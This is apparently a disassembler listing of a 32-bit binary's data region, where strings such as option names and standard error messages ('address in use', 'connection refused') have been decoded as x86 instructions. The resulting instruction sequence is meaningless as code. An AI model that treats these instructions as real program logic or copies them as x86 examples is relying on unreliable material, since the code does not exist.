  4016d7:	add    BYTE PTR [edi+0x70],ch
  4016da:	gs jb  0x40173e
  4016dd:	je     0x401748
  4016df:	outs   dx,DWORD PTR ds:[esi]
  4016e0:	outs   dx,BYTE PTR ds:[esi]
  4016e1:	pop    edi
  4016e2:	imul   ebp,DWORD PTR [esi+0x5f],0x676f7270
  4016e9:	jb     0x401750
  4016eb:	jae    0x401760
  4016ed:	add    BYTE PTR [eax],al
  4016ef:	add    BYTE PTR [ecx+0x6e],ch
  4016f2:	je     0x401759
  4016f4:	jb     0x401768
  4016f6:	jne    0x401768
  4016f8:	je     0x40175f
  4016fa:	add    BYTE PTR fs:[ecx+0x6e],ch
  4016fe:	jbe    0x401761
  401700:	ins    BYTE PTR es:[edi],dx
  401701:	imul   esp,DWORD PTR [edi+ebx*2+0x61],0x6d756772
  401709:	outs   dx,BYTE PTR gs:[esi]
  40170b:	je     0x40170d
  40170d:	add    BYTE PTR [eax],al
  40170f:	add    BYTE PTR [ecx+0x6c],ah
  401712:	jb     0x401779
  401714:	popa   
  401715:	fs jns 0x401777
  401718:	arpl   WORD PTR [edi+0x6e],bp
  40171b:	outs   dx,BYTE PTR ds:[esi]
  40171c:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  401721:	add    BYTE PTR [eax],al
  401723:	add    BYTE PTR [edi+ebp*2+0x6f],dh
  401727:	pop    edi
  401728:	ins    DWORD PTR es:[edi],dx
  401729:	popa   
  40172a:	outs   dx,BYTE PTR ds:[esi]
  40172b:	jns    0x40178c
  40172d:	imul   bp,WORD PTR [ebp+eiz*2+0x73],0x6f5f
  401734:	jo     0x40179b
  401736:	outs   dx,BYTE PTR ds:[esi]
  401737:	add    BYTE PTR [ebp+0x65],ch
  40173a:	jae    0x4017af
  40173c:	popa   
  40173d:	addr16 gs pop edi
  401740:	jae    0x4017ab
  401742:	jp     0x4017a9
  401744:	add    BYTE PTR [eax],al
  401746:	add    BYTE PTR [eax],al
  401748:	imul   bp,WORD PTR [ebp+eiz*2+0x6e],0x6d61
  40174f:	gs pop edi
  401751:	je     0x4017c2
  401753:	outs   dx,DWORD PTR ds:[esi]
  401754:	pop    edi
  401755:	ins    BYTE PTR es:[edi],dx
  401756:	outs   dx,DWORD PTR ds:[esi]
  401757:	outs   dx,BYTE PTR ds:[esi]
  401758:	add    BYTE PTR [bx+si],al
  40175b:	add    BYTE PTR [esi+0x65],ch
  40175e:	je     0x4017d7
  401760:	outs   dx,DWORD PTR ds:[esi]
  401761:	jb     0x4017ce
  401763:	pop    edi
  401764:	outs   dx,DWORD PTR fs:[esi]
  401766:	ja     0x4017d6
  401768:	add    BYTE PTR [eax],al
  40176a:	add    BYTE PTR [eax],al
  40176c:	outs   dx,BYTE PTR ds:[esi]
  40176d:	gs je  0x4017e7
  401770:	outs   dx,DWORD PTR ds:[esi]
  401771:	jb     0x4017de
  401773:	pop    edi
  401774:	jb     0x4017db
  401776:	jae    0x4017dd
  401778:	je     0x40177a
  40177a:	add    BYTE PTR [eax],al
  40177c:	outs   dx,BYTE PTR ds:[esi]
  40177d:	gs je  0x4017f7
  401780:	outs   dx,DWORD PTR ds:[esi]
  401781:	jb     0x4017ee
  401783:	pop    edi
  401784:	jne    0x4017f4
  401786:	jb     0x4017ed
  401788:	popa   
  401789:	arpl   WORD PTR [eax+0x61],bp
  40178c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  401790:	outs   dx,BYTE PTR ds:[esi]
  401791:	outs   dx,DWORD PTR ds:[esi]
  401792:	pop    edi
  401793:	bound  esi,QWORD PTR [ebp+0x66]
  401796:	data16 gs jb 0x4017f9
  40179a:	jae    0x40180c
  40179c:	popa   
  40179d:	arpl   WORD PTR [ebp+0x0],sp
  4017a0:	outs   dx,BYTE PTR ds:[esi]
  4017a1:	outs   dx,DWORD PTR ds:[esi]
  4017a2:	pop    edi
  4017a3:	jo     0x401817
  4017a5:	outs   dx,DWORD PTR ds:[esi]
  4017a6:	je     0x401817
  4017a8:	arpl   WORD PTR [edi+0x6c],bp
  4017ab:	pop    edi
  4017ac:	outs   dx,DWORD PTR ds:[esi]
  4017ad:	jo     0x401823
  4017af:	imul   ebp,DWORD PTR [edi+0x6e],0x6f6e0000
  4017b6:	je     0x401817
  4017b8:	arpl   WORD PTR [edi+0x6e],bp
  4017bb:	outs   dx,BYTE PTR ds:[esi]
  4017bc:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  4017c1:	add    BYTE PTR [eax],al
  4017c3:	add    BYTE PTR [esi+0x6f],ch
  4017c6:	je     0x401827
  4017c8:	popa   
  4017c9:	pop    edi
  4017ca:	jae    0x40183b
  4017cc:	arpl   WORD PTR [ebx+0x65],bp
  4017cf:	je     0x4017d1
  4017d1:	add    BYTE PTR [eax],al
  4017d3:	add    BYTE PTR [edi+0x70],ch
  4017d6:	gs jb  0x40183a
  4017d9:	je     0x401844
  4017db:	outs   dx,DWORD PTR ds:[esi]
  4017dc:	outs   dx,BYTE PTR ds:[esi]
  4017dd:	pop    edi
  4017de:	outs   dx,BYTE PTR ds:[esi]
  4017df:	outs   dx,DWORD PTR ds:[esi]
  4017e0:	je     0x401841
  4017e2:	jae    0x401859
  4017e4:	jo     0x401856
  4017e6:	outs   dx,DWORD PTR ds:[esi]
  4017e7:	jb     0x40185d
  4017e9:	gs add BYTE PTR fs:[eax+0x72],dh
  4017ee:	outs   dx,DWORD PTR ds:[esi]
  4017ef:	je     0x401860
  4017f1:	arpl   WORD PTR [edi+0x6c],bp
  4017f4:	pop    edi
  4017f5:	outs   dx,BYTE PTR ds:[esi]
  4017f6:	outs   dx,DWORD PTR ds:[esi]
  4017f7:	je     0x401858
  4017f9:	jae    0x401870
  4017fb:	jo     0x40186d
  4017fd:	outs   dx,DWORD PTR ds:[esi]
  4017fe:	jb     0x401874
  401800:	gs add BYTE PTR fs:[eax],al
  401804:	ja     0x401878
  401806:	outs   dx,DWORD PTR ds:[esi]
  401807:	outs   dx,BYTE PTR ds:[esi]
  401808:	addr16 pop edi
  40180a:	jo     0x40187e
  40180c:	outs   dx,DWORD PTR ds:[esi]
  40180d:	je     0x40187e
  40180f:	arpl   WORD PTR [edi+0x6c],bp
  401812:	pop    edi
  401813:	je     0x40188e
  401815:	jo     0x40187c
  401817:	add    BYTE PTR [ecx+ebp*2+0x6d],dh
  40181b:	gs fs pop edi
  40181e:	outs   dx,DWORD PTR ds:[esi]
  40181f:	jne    0x401895
  401821:	add    BYTE PTR [eax],al
  401823:	add    BYTE PTR [edi+0x70],ch
  401826:	gs jb  0x40188a
  401829:	je     0x401894
  40182b:	outs   dx,DWORD PTR ds:[esi]
  40182c:	outs   dx,BYTE PTR ds:[esi]
  40182d:	pop    edi
  40182e:	ja     0x40189f
  401830:	jne    0x40189e
  401832:	fs pop edi
  401834:	bound  ebp,QWORD PTR [edi+ebp*2+0x63]
  401838:	imul   eax,DWORD PTR [eax],0x0
  40183b:	add    BYTE PTR [eax],al
  40183d:	add    BYTE PTR [eax],al
  40183f:	add    BYTE PTR [esi+0x0],ah
  401842:	add    BYTE PTR [eax],al
  401844:	mov    eax,0x6400401a
  401849:	add    BYTE PTR [eax],al
  40184b:	add    al,bl
  40184d:	sbb    al,BYTE PTR [eax+0x0]
  401850:	add    BYTE PTR gs:[eax],al
  401853:	add    al,ch
  401855:	sbb    al,BYTE PTR [eax+0x0]
  401858:	jno    0x40185a
  40185a:	add    BYTE PTR [eax],al
  40185c:	add    BYTE PTR [ebx],bl
  40185e:	inc    eax
  40185f:	add    BYTE PTR [edi],al
  401861:	add    BYTE PTR [eax],al
  401863:	add    BYTE PTR [ebx+ebx*1],dl
  401866:	inc    eax
  401867:	add    BYTE PTR [ecx],ah
  401869:	add    BYTE PTR [eax],al
  40186b:	add    BYTE PTR [ebx+ebx*1],ch
  40186e:	inc    eax
  40186f:	add    BYTE PTR [esi],cl
  401871:	add    BYTE PTR [eax],al
  401873:	add    BYTE PTR [ebx+ebx*1+0x40],al
  401877:	add    BYTE PTR [ecx],cl
  401879:	add    BYTE PTR [eax],al
  40187b:	add    BYTE PTR [eax+0x1b],dl
  40187e:	inc    eax
  40187f:	add    BYTE PTR [eax+0x0],ch
  401882:	add    BYTE PTR [eax],al
  401884:	sbb    eax,DWORD PTR fs:[eax+0x0]
  401888:	and    BYTE PTR [eax],al
  40188a:	add    BYTE PTR [eax],al
  40188c:	jo     0x4018a9
  40188e:	inc    eax
  40188f:	add    BYTE PTR [edx+0x0],ch
  401892:	add    BYTE PTR [eax],al
  401894:	jl     0x4018b1
  401896:	inc    eax
  401897:	add    BYTE PTR [edi+0x0],ah
  40189a:	add    BYTE PTR [eax],al
  40189c:	nop
  40189d:	sbb    eax,DWORD PTR [eax+0x0]
  4018a0:	imul   eax,DWORD PTR [eax],0x0
  4018a3:	add    BYTE PTR [eax+0x6c00401b],dh
  4018a9:	add    BYTE PTR [eax],al
  4018ab:	add    ah,al
  4018ad:	sbb    eax,DWORD PTR [eax+0x0]
  4018b0:	adc    al,BYTE PTR [eax]
  4018b2:	add    BYTE PTR [eax],al
  4018b4:	nop
  4018b5:	adc    eax,0x6d0040
  4018ba:	add    BYTE PTR [eax],al
  4018bc:	fcomp  DWORD PTR [ebx]
  4018be:	inc    eax
  4018bf:	add    BYTE PTR [eax],dl
  4018c1:	add    BYTE PTR [eax],al
  4018c3:	add    BYTE PTR [esp+edx*1+0x290040],dh
  4018ca:	add    BYTE PTR [eax],al
  4018cc:	fcom   DWORD PTR [eax+eax*2]
  4018cf:	add    BYTE PTR [eax],cl
  4018d1:	add    BYTE PTR [eax],al
  4018d3:	add    al,bh
  4018d5:	sbb    eax,DWORD PTR [eax+0x0]
  4018d8:	adc    DWORD PTR [eax],eax
  4018da:	add    BYTE PTR [eax],al
  4018dc:	test   BYTE PTR [eax+eax*2],dl
  4018df:	add    BYTE PTR [ebx],bl
  4018e1:	add    BYTE PTR [eax],al
  4018e3:	add    BYTE PTR [eax],dl
  4018e5:	sbb    al,0x40
  4018e7:	add    BYTE PTR [esi],ah
  4018e9:	add    BYTE PTR [eax],al
  4018eb:	add    BYTE PTR [eax+0x28004014],ah
  4018f1:	add    BYTE PTR [eax],al
  4018f3:	add    BYTE PTR [eax],dh
  4018f5:	adc    eax,0x6e0040
  4018fa:	add    BYTE PTR [eax],al
  4018fc:	and    BYTE PTR [eax+eax*2],bl
  4018ff:	add    BYTE PTR [edi+0x0],ch
  401902:	add    BYTE PTR [eax],al
  401904:	xor    al,0x1c
  401906:	inc    eax
  401907:	add    BYTE PTR [edx],ch
  401909:	add    BYTE PTR [eax],al
  40190b:	add    BYTE PTR [eax+0x1c],cl
  40190e:	inc    eax
  40190f:	add    BYTE PTR [ecx],bl
  401911:	add    BYTE PTR [eax],al
  401913:	add    BYTE PTR [eax+0x1c],ah
  401916:	inc    eax
  401917:	add    BYTE PTR [eax+eax*1],al
  40191a:	add    BYTE PTR [eax],al
  40191c:	lock push ss
  40191e:	inc    eax
  40191f:	add    BYTE PTR [esi],dl
  401921:	add    BYTE PTR [eax],al
  401923:	add    ah,ch
  401925:	adc    al,0x40
  401927:	add    BYTE PTR ds:0x84000000,bl
  40192d:	sbb    al,0x40
  40192f:	add    BYTE PTR ds:0xcc000000,al
  401935:	adc    al,0x40
  401937:	add    BYTE PTR ds:0x94000000,dl
  40193d:	sbb    al,0x40
  40193f:	add    BYTE PTR [ebx+0x0],dh
  401942:	add    BYTE PTR [eax],al
  401944:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401945:	sbb    al,0x40
  401947:	add    BYTE PTR [eax+eax*1+0x0],dh
  40194b:	add    BYTE PTR [esp+ebx*1+0x750040],dh
  401952:	add    BYTE PTR [eax],al
  401954:	les    ebx,FWORD PTR [eax+eax*2]
  401957:	add    BYTE PTR [esi+0x0],dh
  40195a:	add    BYTE PTR [eax],al
  40195c:	aam    0x1c
  40195e:	inc    eax
  40195f:	add    BYTE PTR [edi+0x0],dh
  401962:	add    BYTE PTR [eax],al
  401964:	call   0xa405985
  401969:	add    BYTE PTR [eax],al
  40196b:	add    al,bh
  40196d:	sbb    al,0x40
  40196f:	add    BYTE PTR [ecx+0x0],bh
  401972:	add    BYTE PTR [eax],al
  401974:	or     al,0x1d
  401976:	inc    eax
  401977:	add    BYTE PTR [edi],ah
  401979:	add    BYTE PTR [eax],al
  40197b:	add    BYTE PTR [eax+0x15],cl
  40197e:	inc    eax
  40197f:	add    BYTE PTR [eax+0x0],bh
  401982:	add    BYTE PTR [eax],al
  401984:	adc    al,0x1d
  401986:	inc    eax
  401987:	add    BYTE PTR [edx+0x0],bh
  40198a:	add    BYTE PTR [eax],al
  40198c:	sub    al,0x1d
  40198e:	inc    eax
  40198f:	add    BYTE PTR [ebx+0x0],bh
  401992:	add    BYTE PTR [eax],al
  401994:	cmp    BYTE PTR ds:0x1c0040,bl
  40199a:	add    BYTE PTR [eax],al
  40199c:	add    BYTE PTR ds:0x7c0040,dl
  4019a2:	add    BYTE PTR [eax],al
  4019a4:	dec    esp
  4019a5:	sbb    eax,0x60040
  4019aa:	add    BYTE PTR [eax],al
  4019ac:	pusha  
  4019ad:	sbb    eax,0x130040
  4019b2:	add    BYTE PTR [eax],al
  4019b4:	nop
  4019b5:	adc    al,0x40
  4019b7:	add    BYTE PTR [edx],al
  4019b9:	add    BYTE PTR [eax],al
  4019bb:	add    BYTE PTR [edx*1+0x30040],dl
  4019c2:	add    BYTE PTR [eax],al
  4019c4:	jl     0x4019e3
  4019c6:	inc    eax
  4019c7:	add    BYTE PTR [eax+eax*1],dl
  4019ca:	add    BYTE PTR [eax],al
  4019cc:	mov    WORD PTR ds:0x800040,ds
  4019d2:	add    BYTE PTR [eax],al
  4019d4:	pushf  
  4019d5:	sbb    eax,0x7d0040
  4019da:	add    BYTE PTR [eax],al
  4019dc:	lods   al,BYTE PTR ds:[esi]
  4019dd:	sbb    eax,0x7e0040
  4019e2:	add    BYTE PTR [eax],al
  4019e4:	mov    esp,0xc00401d
  4019e9:	add    BYTE PTR [eax],al
  4019eb:	add    BYTE PTR [ebp+edx*1+0x40],bl
  4019ef:	add    BYTE PTR [ecx-0x34000000],al
  4019f5:	sbb    eax,0x690040
  4019fa:	add    BYTE PTR [eax],al
  4019fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019fd:	adc    eax,0x700040
  401a02:	add    BYTE PTR [eax],al
  401a04:	fcomp  QWORD PTR ds:0x10040
  401a0a:	add    BYTE PTR [eax],al
  401a0c:	hlt    
  401a0d:	sbb    eax,0x820040
  401a12:	add    BYTE PTR [eax],al
  401a14:	or     al,0x1e
  401a16:	inc    eax
  401a17:	add    BYTE PTR [eax+eax*1+0x1e240000],cl
  401a1e:	inc    eax
  401a1f:	add    BYTE PTR [ebp+0x3c000000],al
  401a25:	push   ds
  401a26:	inc    eax
  401a27:	add    BYTE PTR ds:0x70000000,cl
  401a2d:	adc    al,0x40
  401a2f:	add    BYTE PTR [esi+0x48000000],al
  401a35:	push   ds
  401a36:	inc    eax
  401a37:	add    BYTE PTR [edi+0x58000000],al
  401a3d:	push   ds
  401a3e:	inc    eax
  401a3f:	add    BYTE PTR [esi],bl
  401a41:	add    BYTE PTR [eax],al
  401a43:	add    BYTE PTR [eax+0x1e],dh
  401a46:	inc    eax
  401a47:	add    BYTE PTR [eax+eax*1],ah
  401a4a:	add    BYTE PTR [eax],al
  401a4c:	mov    BYTE PTR [esi],bl
  401a4e:	inc    eax
  401a4f:	add    BYTE PTR [ebx],cl
  401a51:	add    BYTE PTR [eax],al
  401a53:	add    BYTE PTR [eax+0x15],dh
  401a56:	inc    eax
  401a57:	add    BYTE PTR [edx],ah
  401a59:	add    BYTE PTR [eax],al
  401a5b:	add    BYTE PTR [eax+0x7f00401e],ch
  401a61:	add    BYTE PTR [eax],al
  401a63:	add    BYTE PTR [esi+ebx*1+0x890040],bh
  401a6a:	add    BYTE PTR [eax],al
  401a6c:	aam    0x1e
  401a6e:	inc    eax
  401a6f:	add    BYTE PTR [ebx-0x1c000000],cl
  401a75:	push   ds
  401a76:	inc    eax
  401a77:	add    BYTE PTR [edx-0xc000000],cl
  401a7d:	push   ds
  401a7e:	inc    eax
  401a7f:	add    BYTE PTR [edi],dl
  401a81:	add    BYTE PTR [eax],al
  401a83:	add    BYTE PTR [eax],al
  401a85:	pop    ds
  401a86:	inc    eax
  401a87:	add    BYTE PTR [eax],bl
  401a89:	add    BYTE PTR [eax],al
  401a8b:	add    BYTE PTR [eax+0x1f004015],bh
  401a91:	add    BYTE PTR [eax],al
  401a93:	add    BYTE PTR [eax],ah
  401a95:	pop    ds
  401a96:	inc    eax
  401a97:	add    BYTE PTR [edx+0x0],dh
  401a9a:	add    BYTE PTR [eax],al
  401a9c:	xor    BYTE PTR [edi],bl
  401a9e:	inc    eax
  401a9f:	add    BYTE PTR [eax+eax*1+0x1f500000],al
  401aa6:	inc    eax
  401aa7:	add    BYTE PTR [eax+0x60000000],cl
  401aad:	pop    ds
  401aae:	inc    eax
	...
  401ab7:	add    BYTE PTR [ecx+0x64],ah
  401aba:	fs jb  0x401b22
  401abd:	jae    0x401b32
  401abf:	and    BYTE PTR [esi+0x61],ah
  401ac2:	ins    DWORD PTR es:[edi],dx
  401ac3:	imul   ebp,DWORD PTR [ecx+edi*2+0x20],0x20746f6e
  401acb:	jae    0x401b42
  401acd:	jo     0x401b3f
  401acf:	outs   dx,DWORD PTR ds:[esi]
  401ad0:	jb     0x401b46
  401ad2:	gs add BYTE PTR fs:[eax],al
  401ad6:	add    BYTE PTR [eax],al
  401ad8:	popa   
  401ad9:	fs fs jb 0x401b42
  401add:	jae    0x401b52
  401adf:	and    BYTE PTR [ecx+0x6e],ch
  401ae2:	and    BYTE PTR [ebp+0x73],dh
  401ae5:	add    BYTE PTR gs:[eax],al
  401ae8:	popa   
  401ae9:	fs fs jb 0x401b52
  401aed:	jae    0x401b62
  401aef:	and    BYTE PTR [esi+0x6f],ch
  401af2:	je     0x401b14
  401af4:	popa   
  401af5:	jbe    0x401b58
  401af7:	imul   ebp,DWORD PTR [ecx+eiz*2+0x62],0x656c
  401aff:	add    BYTE PTR [ecx+0x6c],ah
  401b02:	jb     0x401b69
  401b04:	popa   
  401b05:	fs jns 0x401b28
  401b08:	arpl   WORD PTR [edi+0x6e],bp
  401b0b:	outs   dx,BYTE PTR ds:[esi]
  401b0c:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  401b11:	add    BYTE PTR [eax],al
  401b13:	add    BYTE PTR [ecx+0x72],ah
  401b16:	addr16 jne 0x401b86
  401b19:	outs   dx,BYTE PTR gs:[esi]
  401b1b:	je     0x401b3d
  401b1d:	ins    BYTE PTR es:[edi],dx
  401b1e:	imul   esi,DWORD PTR [ebx+0x74],0x6f6f7420
  401b25:	and    BYTE PTR [edi+ebp*2+0x6e],ch
  401b29:	add    BYTE PTR [bx+si],al
  401b2c:	popa   
  401b2d:	jb     0x401b96
  401b2f:	jne    0x401b9e
  401b31:	outs   dx,BYTE PTR gs:[esi]
  401b33:	je     0x401b55
  401b35:	outs   dx,DWORD PTR ds:[esi]
  401b36:	jne    0x401bac
  401b38:	and    BYTE PTR [edi+0x66],ch
  401b3b:	and    BYTE PTR [edi+ebp*2+0x6d],ah
  401b3f:	popa   
  401b40:	imul   ebp,DWORD PTR [esi+0x0],0x64616200
  401b47:	and    BYTE PTR [ecx+0x64],ah
  401b4a:	fs jb  0x401bb2
  401b4d:	jae    0x401bc2
  401b4f:	add    BYTE PTR [edx+0x61],ah
  401b52:	and    BYTE PTR fs:[esi+0x69],ah
  401b56:	ins    BYTE PTR es:[edi],dx
  401b57:	and    BYTE PTR gs:[ebp+eiz*2+0x73],ah
  401b5c:	arpl   WORD PTR [edx+0x69],si
  401b5f:	jo     0x401bd5
  401b61:	outs   dx,DWORD PTR ds:[esi]
  401b62:	jb     0x401b64
  401b64:	bound  esp,QWORD PTR [ecx+0x64]
  401b67:	and    BYTE PTR [ebp+0x65],ch
  401b6a:	jae    0x401bdf
  401b6c:	popa   
  401b6d:	add    BYTE PTR gs:[bp+si+0x72],ah
  401b72:	outs   dx,DWORD PTR ds:[esi]
  401b73:	imul   esp,DWORD PTR [ebp+0x6e],0x20
  401b77:	jo     0x401be2
  401b79:	jo     0x401be0
  401b7b:	add    BYTE PTR [ebx+0x6f],ah
  401b7e:	outs   dx,BYTE PTR ds:[esi]
  401b7f:	outs   dx,BYTE PTR ds:[esi]
  401b80:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  401b85:	outs   dx,BYTE PTR ds:[esi]
  401b86:	and    BYTE PTR [ecx+0x62],ah
  401b89:	outs   dx,DWORD PTR ds:[esi]
  401b8a:	jb     0x401c00
  401b8c:	gs add BYTE PTR fs:[eax],al
  401b90:	arpl   WORD PTR [edi+0x6e],bp
  401b93:	outs   dx,BYTE PTR ds:[esi]
  401b94:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  401b99:	outs   dx,BYTE PTR ds:[esi]
  401b9a:	and    BYTE PTR [ecx+0x6c],ah
  401b9d:	jb     0x401c04
  401b9f:	popa   
  401ba0:	fs jns 0x401bc3
  401ba3:	imul   ebp,DWORD PTR [esi+0x20],0x676f7270
  401baa:	jb     0x401c11
  401bac:	jae    0x401c21
  401bae:	add    BYTE PTR [eax],al
  401bb0:	arpl   WORD PTR [edi+0x6e],bp
  401bb3:	outs   dx,BYTE PTR ds:[esi]
  401bb4:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  401bb9:	outs   dx,BYTE PTR ds:[esi]
  401bba:	and    BYTE PTR [edx+0x65],dh
  401bbd:	data16 jne 0x401c33
  401bc0:	gs add BYTE PTR fs:[eax],al
  401bc4:	arpl   WORD PTR [edi+0x6e],bp
  401bc7:	outs   dx,BYTE PTR ds:[esi]
  401bc8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  401bcd:	outs   dx,BYTE PTR ds:[esi]
  401bce:	and    BYTE PTR [edx+0x65],dh
  401bd1:	jae    0x401c38
  401bd3:	je     0x401bd5
  401bd5:	add    BYTE PTR [eax],al
  401bd7:	add    BYTE PTR [ebp+eiz*2+0x73],ah
  401bdb:	je     0x401c46
  401bdd:	outs   dx,BYTE PTR ds:[esi]
  401bde:	popa   
  401bdf:	je     0x401c4a
  401be1:	outs   dx,DWORD PTR ds:[esi]
  401be2:	outs   dx,BYTE PTR ds:[esi]
  401be3:	and    BYTE PTR [ecx+0x64],ah
  401be6:	fs jb  0x401c4e
  401be9:	jae    0x401c5e
  401beb:	and    BYTE PTR [edx+0x65],dh
  401bee:	jno    0x401c65
  401bf0:	imul   esi,DWORD PTR [edx+0x65],0x64
  401bf7:	add    BYTE PTR [ebp+0x78],ah
  401bfa:	arpl   WORD PTR gs:[ebp+0x74],si
  401bfe:	popa   
  401bff:	bound  ebp,QWORD PTR [ebp+eiz*2+0x20]
  401c03:	outs   dx,WORD PTR ds:[esi]
  401c05:	jb     0x401c74
  401c07:	popa   
  401c08:	je     0x401c2a
  401c0a:	gs jb  0x401c7f
  401c0d:	outs   dx,DWORD PTR ds:[esi]
  401c0e:	jb     0x401c10
  401c10:	imul   bp,WORD PTR [ebp+eiz*2+0x20],0x6f74
  401c17:	outs   dx,DWORD PTR ds:[esi]
  401c18:	and    BYTE PTR [ecx+eiz*2+0x72],ch
  401c1c:	add    BYTE PTR gs:[bx+si],al
  401c20:	push   0x2074736f
  401c25:	jne    0x401c95
  401c27:	jb     0x401c8e
  401c29:	popa   
  401c2a:	arpl   WORD PTR [eax+0x61],bp
  401c2d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  401c31:	add    BYTE PTR [eax],al
  401c33:	add    BYTE PTR [ecx+0x64],ch
  401c36:	outs   dx,BYTE PTR gs:[esi]
  401c38:	je     0x401ca3
  401c3a:	imul   sp,WORD PTR [ebp+0x72],0x7220
  401c40:	gs ins DWORD PTR es:[edi],dx
  401c42:	outs   dx,DWORD PTR ds:[esi]
  401c43:	jbe    0x401caa
  401c45:	add    BYTE PTR fs:[eax],al
  401c48:	imul   ebp,DWORD PTR [esp+ebp*2+0x65],0x206c6167
  401c50:	bound  edi,QWORD PTR [ecx+0x74]
  401c53:	and    BYTE PTR gs:[ebx+0x65],dh
  401c57:	jno    0x401cce
  401c59:	outs   dx,BYTE PTR gs:[esi]
  401c5b:	arpl   WORD PTR [ebp+0x0],sp
  401c5e:	add    BYTE PTR [eax],al
  401c60:	imul   ebp,DWORD PTR [esi+0x61],0x6f727070
  401c67:	jo     0x401cdb
  401c69:	imul   esp,DWORD PTR [ecx+0x74],0x6f692065
  401c70:	and    BYTE PTR [ebx+0x6f],ah
  401c73:	outs   dx,BYTE PTR ds:[esi]
  401c74:	je     0x401ce8
  401c76:	outs   dx,DWORD PTR ds:[esi]
  401c77:	ins    BYTE PTR es:[edi],dx
  401c78:	and    BYTE PTR [edi+0x70],ch
  401c7b:	gs jb  0x401cdf
  401c7e:	je     0x401ce9
  401c80:	outs   dx,DWORD PTR ds:[esi]
  401c81:	outs   dx,BYTE PTR ds:[esi]
  401c82:	add    BYTE PTR [eax],al
  401c84:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
  401c8b:	and    BYTE PTR [ebx+0x65],dh
  401c8e:	imul   eax,DWORD PTR gs:[eax],0x0
  401c92:	add    BYTE PTR [eax],al
  401c94:	imul   esi,DWORD PTR [ebx+0x20],0x69642061
  401c9b:	jb     0x401d02
  401c9d:	arpl   WORD PTR [edi+ebp*2+0x72],si
  401ca1:	jns    0x401ca3
  401ca3:	add    BYTE PTR [ebp+0x65],ch
  401ca6:	jae    0x401d1b
  401ca8:	popa   
  401ca9:	and    BYTE PTR gs:[bp+di+0x69],dh
  401cae:	jp     0x401d15
  401cb0:	add    BYTE PTR [eax],al
  401cb2:	add    BYTE PTR [eax],al
  401cb4:	outs   dx,BYTE PTR ds:[esi]
  401cb5:	gs je  0x401d2f
  401cb8:	outs   dx,DWORD PTR ds:[esi]
  401cb9:	jb     0x401d26
  401cbb:	and    BYTE PTR [edi+ebp*2+0x77],ah
  401cbf:	outs   dx,BYTE PTR ds:[esi]
  401cc0:	add    BYTE PTR [eax],al
  401cc2:	add    BYTE PTR [eax],al
  401cc4:	outs   dx,BYTE PTR ds:[esi]
  401cc5:	gs je  0x401d3f
  401cc8:	outs   dx,DWORD PTR ds:[esi]
  401cc9:	jb     0x401d36
  401ccb:	and    BYTE PTR [edx+0x65],dh
  401cce:	jae    0x401d35
  401cd0:	je     0x401cd2
  401cd2:	add    BYTE PTR [eax],al
  401cd4:	outs   dx,BYTE PTR ds:[esi]
  401cd5:	gs je  0x401d4f
  401cd8:	outs   dx,DWORD PTR ds:[esi]
  401cd9:	jb     0x401d46
  401cdb:	and    BYTE PTR [ebp+0x6e],dh
  401cde:	jb     0x401d45
  401ce0:	popa   
  401ce1:	arpl   WORD PTR [eax+0x61],bp
  401ce4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  401ce8:	outs   dx,BYTE PTR ds:[esi]
  401ce9:	outs   dx,DWORD PTR ds:[esi]
  401cea:	and    BYTE PTR [edx+0x75],ah
  401ced:	data16 data16 gs jb 0x401d12
  401cf2:	jae    0x401d64
  401cf4:	popa   
  401cf5:	arpl   WORD PTR [ebp+0x0],sp
  401cf8:	outs   dx,BYTE PTR ds:[esi]
  401cf9:	outs   dx,DWORD PTR ds:[esi]
  401cfa:	and    BYTE PTR [ebx+0x68],ah
  401cfd:	imul   ebp,DWORD PTR [esp+eiz*2+0x20],0x636f7270
  401d05:	gs jae 0x401d7b
  401d08:	add    BYTE PTR [eax],al
  401d0a:	add    BYTE PTR [eax],al
  401d0c:	outs   dx,BYTE PTR ds:[esi]
  401d0d:	outs   dx,DWORD PTR ds:[esi]
  401d0e:	and    BYTE PTR [ecx+ebp*2+0x6e],ch
  401d12:	imul   eax,DWORD PTR [eax],0x6e
  401d15:	outs   dx,DWORD PTR ds:[esi]
  401d16:	and    BYTE PTR [ebp+0x65],ch
  401d19:	jae    0x401d8e
  401d1b:	popa   
  401d1c:	and    BYTE PTR gs:[bx+di+0x76],ah
  401d21:	popa   
  401d22:	imul   ebp,DWORD PTR [ecx+eiz*2+0x62],0x656c
  401d2a:	add    BYTE PTR [eax],al
  401d2c:	outs   dx,BYTE PTR ds:[esi]
  401d2d:	outs   dx,DWORD PTR ds:[esi]
  401d2e:	and    BYTE PTR [ebp+0x65],ch
  401d31:	jae    0x401da6
  401d33:	popa   
  401d34:	add    BYTE PTR gs:[bx+si],al
  401d38:	outs   dx,BYTE PTR ds:[esi]
  401d39:	outs   dx,DWORD PTR ds:[esi]
  401d3a:	and    BYTE PTR [eax+0x72],dh
  401d3d:	outs   dx,DWORD PTR ds:[esi]
  401d3e:	je     0x401daf
  401d40:	arpl   WORD PTR [edi+0x6c],bp
  401d43:	and    BYTE PTR [edi+0x70],ch
  401d46:	je     0x401db1
  401d48:	outs   dx,DWORD PTR ds:[esi]
  401d49:	outs   dx,BYTE PTR ds:[esi]
  401d4a:	add    BYTE PTR [eax],al
  401d4c:	outs   dx,BYTE PTR ds:[esi]
  401d4d:	outs   dx,DWORD PTR ds:[esi]
  401d4e:	and    BYTE PTR [ebx+0x74],dh
  401d51:	jb     0x401db8
  401d53:	popa   
  401d54:	ins    DWORD PTR es:[edi],dx
  401d55:	and    BYTE PTR [edx+0x65],dh
  401d58:	jae    0x401dc9
  401d5a:	jne    0x401dce
  401d5c:	arpl   WORD PTR [ebp+0x73],sp
  401d5f:	add    BYTE PTR [esi+0x6f],ch
  401d62:	and    BYTE PTR [ebx+0x75],dh
  401d65:	arpl   WORD PTR [eax+0x20],bp
